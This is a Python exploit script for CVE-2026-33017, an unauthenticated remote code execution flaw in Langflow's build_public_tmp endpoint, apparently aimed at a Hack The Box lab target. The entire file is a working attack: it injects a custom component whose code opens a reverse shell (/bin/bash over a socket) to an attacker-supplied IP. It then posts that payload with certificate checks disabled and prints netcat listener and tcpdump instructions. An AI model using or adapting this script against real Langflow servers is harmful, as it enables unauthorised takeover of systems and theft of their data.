#!/usr/bin/env python3
"""
CVE-2026-33017 Langflow/FireFlow Exploit
Unauthenticated RCE via build_public_tmp endpoint
"""

import requests
import json
import sys
import argparse
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def create_exploit_payload(kali_ip, kali_port=4444):
    """Create a more reliable reverse shell payload."""
    # Try multiple reverse shell methods
    reverse_shell_code = f'''import os,socket,subprocess,threading

def connect_back():
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("{kali_ip}",{kali_port}))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        subprocess.call(["/bin/bash","-i"])
    except Exception as e:
        # Fallback: write proof file
        open("/tmp/rce_proof","w").write(f"RCE successful on {{os.uname()}}")

# Run in background thread to not block
t=threading.Thread(target=connect_back)
t.daemon=True
t.start()

# Also write proof file immediately
open("/tmp/rce_proof","w").write(f"RCE from {{socket.gethostname()}}")

from lfx.custom.custom_component.component import Component
from lfx.io import Output
from lfx.schema.data import Data

class ExploitComp(Component):
    display_name="X"
    outputs=[Output(display_name="O",name="o",method="r")]
    def r(self)->Data:
        return Data(data={{}})'''
    
    return reverse_shell_code

def exploit(kali_ip, flow_id, domain, kali_port=4444):
    """Execute the exploit against the target."""
    
    url = f"https://{domain}/api/v1/build_public_tmp/{flow_id}/flow"
    malicious_code = create_exploit_payload(kali_ip, kali_port)
    
    payload = {
        "data": {
            "nodes": [{
                "id": "Exploit-001",
                "type": "genericNode",
                "position": {"x": 0, "y": 0},
                "data": {
                    "id": "Exploit-001",
                    "type": "ExploitComp",
                    "node": {
                        "template": {
                            "code": {
                                "type": "code",
                                "required": True,
                                "show": True,
                                "multiline": True,
                                "value": malicious_code,
                                "name": "code",
                                "password": False,
                                "advanced": False,
                                "dynamic": False
                            },
                            "_type": "Component"
                        },
                        "description": "X",
                        "base_classes": ["Data"],
                        "display_name": "ExploitComp",
                        "name": "ExploitComp",
                        "frozen": False,
                        "outputs": [{
                            "types": ["Data"],
                            "selected": "Data",
                            "name": "o",
                            "display_name": "O",
                            "method": "r",
                            "value": "__UNDEFINED__",
                            "cache": True,
                            "allows_loop": False,
                            "tool_mode": False,
                            "hidden": None,
                            "required_inputs": None,
                            "group_outputs": False
                        }],
                        "field_order": ["code"],
                        "beta": False,
                        "edited": False
                    }
                }
            }],
            "edges": []
        },
        "inputs": None
    }
    
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    
    cookies = {
        "client_id": "attacker"
    }
    
    print(f"[*] Target: {url}")
    print(f"[*] Reverse shell to: {kali_ip}:{kali_port}")
    print(f"[*] Flow ID: {flow_id}")
    print(f"[*] Sending payload...")
    
    try:
        response = requests.post(
            url,
            headers=headers,
            cookies=cookies,
            json=payload,
            verify=False,
            timeout=10
        )
        
        print(f"\n[+] Response Status Code: {response.status_code}")
        
        if response.status_code == 200:
            print(f"[+] Payload sent successfully!")
            print(f"[+] Code executes asynchronously during graph building")
            print(f"[+] Check for proof file in 3-5 seconds...")
            
            # Try to verify RCE by checking if proof file was created
            # (This would require another endpoint, but we can't do that here)
            print(f"\n[!] If no shell connects, try:")
            print(f"    - Different port (8080, 9001, 1337)")
            print(f"    - TCPDump to see if connection attempts arrive: tcpdump -i tun0 -n port {kali_port}")
            print(f"    - The target may not reach your Kali IP on the VPN")
        else:
            print(f"[-] Unexpected response: {response.status_code}")
            print(f"[-] Response: {response.text[:300]}")
            
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(
        description='CVE-2026-33017 Langflow/FireFlow Exploit',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Example usage:
  python3 exploit.py -i 10.10.15.134 -f <flow_id> -d flow.fireflow.htb -p 4444

Troubleshooting:
  - Use tcpdump to monitor incoming connections
  - Try different ports (8080, 9001, 1337)
  - Check if target can reach your Kali IP on the HTB VPN
        '''
    )
    
    parser.add_argument('-i', '--ip', required=True, help='Your Kali IP address')
    parser.add_argument('-f', '--flow-id', required=True, help='Target flow UUID')
    parser.add_argument('-d', '--domain', required=True, help='Target domain')
    parser.add_argument('-p', '--port', default=4444, type=int, help='Listener port')
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("CVE-2026-33017 Langflow/FireFlow Exploit")
    print("=" * 60)
    
    exploit(args.ip, args.flow_id, args.domain, args.port)
    
    print(f"\n[!] Start listener: nc -lvnp {args.port}")
    print(f"[!] Monitor traffic: tcpdump -i tun0 -n port {args.port}")

if __name__ == '__main__':
    main()   
